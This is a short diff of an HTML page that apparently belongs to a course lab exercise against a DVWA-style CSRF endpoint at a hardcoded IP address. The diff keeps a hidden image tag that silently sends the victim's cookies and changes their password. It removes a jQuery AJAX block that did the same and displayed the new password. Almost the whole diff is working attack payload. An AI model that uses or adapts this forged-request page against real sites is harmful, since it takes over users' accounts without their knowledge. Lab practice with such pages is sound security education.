@@ -8,25 +8,5 @@
 
         <!--send PHPSESSIONID and SECURITY cookie with this request-->
         <img src="http://35.184.56.63/PA4/vulnerabilities/csrf/?password_new=pqrst&password_conf=pqrst&Change=Change#" style="display:none;">
-        <script src='https://code.jquery.com/jquery-3.2.1.min.js'></script>
-        <script type="text/javascript">
-            var password = 'password';
-            var data = {
-                'password_new': password,
-                'password_conf': password,
-                'Change': 'Change'
-            }
-
-            //change passowrd using stolen csrf
-            $.ajax({
-                url: 'http://35.184.56.63/PA4/vulnerabilities/csrf/',
-                type: 'GET',
-                data: data,
-                success: function(response){
-                    console.log(response);
-                    alert('New password: ' + password);
-                }
-            });
-        </script>
     </body>
 </html>
